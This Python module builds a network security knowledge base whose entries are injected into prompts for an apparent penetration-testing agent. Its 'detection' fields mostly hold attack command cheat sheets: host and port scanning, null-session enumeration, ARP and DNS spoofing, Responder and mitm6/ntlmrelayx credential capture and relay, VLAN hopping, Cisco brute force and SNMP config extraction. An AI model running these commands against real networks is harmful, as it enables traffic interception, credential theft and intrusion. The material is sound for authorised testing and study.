"""Network security knowledge base.

Deep knowledge about network vulnerabilities:
1. Network reconnaissance and mapping
2. ARP/DNS poisoning and MITM
3. VLAN hopping and segmentation bypass
4. Protocol-level attacks
5. Network device exploitation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class NetworkPattern:
    """A network security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


NETWORK_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "net-001", "name": "Network Reconnaissance",
        "category": "recon", "severity": "info",
        "desc": "Network mapping and service discovery.",
        "detection": (
            "NETWORK RECONNAISSANCE:\n"
            "HOST DISCOVERY:\n"
            "  nmap -sn 192.168.1.0/24  # Ping sweep\n"
            "  nmap -sn -PE 10.0.0.0/8  # ICMP echo\n"
            "  nmap -sn -PA 80,443 10.0.0.0/24  # TCP ACK\n"
            "  masscan 10.0.0.0/8 -p80,443,22,445 --rate=10000\n"
            "  arp-scan --localnet  # ARP discovery\n"
            "PORT SCANNING:\n"
            "  nmap -sS -p- -T4 <target>  # SYN scan all ports\n"
            "  nmap -sU --top-ports 100 <target>  # UDP scan\n"
            "  nmap -sV -sC -O <target>  # Version, scripts, OS\n"
            "  nmap -A <target>  # Aggressive (all features)\n"
            "SERVICE ENUMERATION:\n"
            "  # SMB\n"
            "  smbclient -L //<target> -N  # List shares\n"
            "  crackmapexec smb <target> -u '' -p '' --shares\n"
            "  enum4linux-ng <target>  # Full SMB enumeration\n"
            "  # SNMP\n"
            "  snmpwalk -v2c -c public <target>\n"
            "  onesixtyone -c community.txt <target>\n"
            "  # LDAP\n"
            "  ldapsearch -x -H ldap://<target> -b '' namingContexts\n"
            "  # RPC\n"
            "  rpcclient -U '' <target>  # Null session\n"
            "  rpcclient> enumdomusers"
        ),
        "tools": ["nmap", "masscan", "crackmapexec"],
    },
    {
        "id": "net-002", "name": "ARP and DNS Poisoning",
        "category": "mitm", "severity": "high",
        "desc": "Man-in-the-middle via ARP/DNS poisoning.",
        "detection": (
            "ARP AND DNS POISONING:\n"
            "ARP SPOOFING:\n"
            "  # arpspoof (dsniff suite)\n"
            "  arpspoof -i eth0 -t <victim> <gateway>\n"
            "  arpspoof -i eth0 -t <gateway> <victim>\n"
            "  # Enable IP forwarding\n"
            "  echo 1 > /proc/sys/net/ipv4/ip_forward\n"
            "  # Ettercap\n"
            "  ettercap -T -M arp:remote /<victim>// /<gateway>//\n"
            "  # Bettercap (modern)\n"
            "  bettercap -iface eth0\n"
            "  net.probe on\n"
            "  arp.spoof on\n"
            "  set arp.spoof.targets <victim>\n"
            "DNS POISONING:\n"
            "  # Bettercap\n"
            "  set dns.spoof.all true\n"
            "  set dns.spoof.domains target.com\n"
            "  dns.spoof on\n"
            "  # Responder (LLMNR/NBT-NS/mDNS)\n"
            "  responder -I eth0 -wrf\n"
            "  # Captures NTLMv2 hashes automatically\n"
            "DETECTION:\n"
            "  - ARP table changes (arp -a monitoring)\n"
            "  - Duplicate MAC addresses\n"
            "  - arpwatch for ARP table monitoring\n"
            "  - Static ARP entries for critical systems"
        ),
        "tools": ["bettercap", "responder", "ettercap"],
    },
    {
        "id": "net-003", "name": "VLAN Hopping and Segmentation",
        "category": "vlan", "severity": "high",
        "desc": "Bypassing network segmentation via VLAN attacks.",
        "detection": (
            "VLAN HOPPING:\n"
            "SWITCH SPOOFING:\n"
            "  - Attacker's NIC acts as trunk port\n"
            "  - Uses DTP (Dynamic Trunking Protocol)\n"
            "  - Yersinia: yersinia -G  # GUI for protocol attacks\n"
            "  yersinia dtp -attack 1 -interface eth0\n"
            "DOUBLE TAGGING:\n"
            "  - Encapsulate frame with two 802.1Q tags\n"
            "  - Outer tag matches native VLAN\n"
            "  - Switch strips outer tag, forwards to inner VLAN\n"
            "  - Only works one-way (no return traffic)\n"
            "  # Craft with Scapy\n"
            "  # Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=target)/IP()/...\n"
            "VLAN ENUMERATION:\n"
            "  # CDP/LLDP\n"
            "  cdp-listener  # Listen for CDP packets\n"
            "  lldpctl  # LLDP neighbor info\n"
            "  # Identify VLANs\n"
            "  nmap --script broadcast-dhcp-discover\n"
            "  # Tcpdump for tagged frames\n"
            "  tcpdump -i eth0 -e 'vlan'\n"
            "SEGMENTATION TESTING:\n"
            "  - Verify firewall rules between VLANs\n"
            "  - Test inter-VLAN routing restrictions\n"
            "  - Check for routing leaks\n"
            "  - Verify ACLs on switch ports"
        ),
        "tools": ["yersinia", "nmap", "tcpdump"],
    },
    {
        "id": "net-004", "name": "IPv6 Security",
        "category": "ipv6", "severity": "high",
        "desc": "IPv6-specific attacks and reconnaissance.",
        "detection": (
            "IPv6 SECURITY:\n"
            "ENUMERATION:\n"
            "  # IPv6 host discovery\n"
            "  nmap -6 --script ipv6-multicast-mld-list\n"
            "  alive6 eth0  # ICMPv6 ping\n"
            "  # Enumerate link-local addresses\n"
            "  ping6 -c 2 ff02::1%eth0  # All nodes multicast\n"
            "ATTACKS:\n"
            "  SLAAC SPOOFING:\n"
            "    - Send rogue Router Advertisements\n"
            "    - Become default gateway for IPv6\n"
            "    - MITM all IPv6 traffic\n"
            "    # mitm6\n"
            "    mitm6 -d company.local\n"
            "    # Combined with ntlmrelayx\n"
            "    ntlmrelayx.py -6 -t ldaps://dc01 -wh fakewpad\n"
            "  DHCPv6 SPOOFING:\n"
            "    - Respond to DHCPv6 requests\n"
            "    - Set attacker as DNS server\n"
            "    - Redirect DNS queries\n"
            "  NDP SPOOFING:\n"
            "    - Neighbor Discovery Protocol\n"
            "    - Similar to ARP spoofing but IPv6\n"
            "    - parasite6 eth0  # NDP spoofing tool\n"
            "DUAL-STACK ISSUES:\n"
            "  - IPv6 enabled but not monitored\n"
            "  - No firewall rules for IPv6\n"
            "  - IPv6 tunneling bypass (6to4, Teredo)"
        ),
        "tools": ["mitm6", "nmap", "alive6"],
    },
    {
        "id": "net-005", "name": "Network Device Exploitation",
        "category": "device", "severity": "critical",
        "desc": "Exploiting routers, switches, and firewalls.",
        "detection": (
            "NETWORK DEVICE EXPLOITATION:\n"
            "ROUTER/SWITCH:\n"
            "  - Default credentials (admin/admin, cisco/cisco)\n"
            "  - SNMP community strings (public, private)\n"
            "  - Telnet/SSH with weak credentials\n"
            "  - Web management interface vulnerabilities\n"
            "  # Cisco\n"
            "  cisco-torch -A <target>  # Cisco scanner\n"
            "  nmap --script cisco-brute <target>\n"
            "  # Extract config via SNMP\n"
            "  snmpset -v1 -c <community> <target>\\\n"
            "    1.3.6.1.4.1.9.2.1.55.<tftp-server> s running-config\n"
            "FIREWALL:\n"
            "  - Rule bypass (fragmentation, tunneling)\n"
            "  - Management interface exposed\n"
            "  - Default admin credentials\n"
            "  - Firmware vulnerabilities\n"
            "  # Firewall fingerprinting\n"
            "  nmap -sA <target>  # ACK scan for filtering\n"
            "  nmap --script firewall-bypass <target>\n"
            "WIFI AP:\n"
            "  - Default credentials on management\n"
            "  - WPS enabled (pixie dust, brute force)\n"
            "  - Outdated firmware\n"
            "  - Client isolation bypass\n"
            "  - Hidden SSID enumeration\n"
            "VPN:\n"
            "  - IKE aggressive mode (hash capture)\n"
            "  ike-scan -M -A <target>  # Detect VPN\n"
            "  - SSL VPN interface vulnerabilities"
        ),
        "tools": ["nmap", "snmpwalk", "ike-scan"],
    },
]


class NetworkSecurityKB:
    """Network security knowledge base.

    Provides network vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, NetworkPattern] = {}
        self._log = logger.bind(component="network_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load network patterns."""
        for data in NETWORK_PATTERNS:
            pattern = NetworkPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[NetworkPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_network_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build network security prompt."""
        lines = ["## Network Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
